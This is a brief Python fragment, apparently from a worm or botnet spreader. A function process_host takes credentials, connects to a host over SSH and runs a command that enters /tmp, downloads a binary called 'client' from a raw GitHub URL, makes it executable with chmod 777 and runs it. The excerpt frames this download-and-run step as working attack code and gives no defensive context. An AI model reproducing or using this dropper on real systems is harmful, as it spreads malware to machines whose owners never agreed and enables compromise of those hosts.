...
def process_host(credentials):
    ...
    try:
        ...
        stdin, stdout, stderr = ssh.exec_command('cd /tmp; wget https://raw.githubusercontent.com/20Matrix77/jdifjshfirej/refs/heads/main/client; chmod 777 client; ./client')
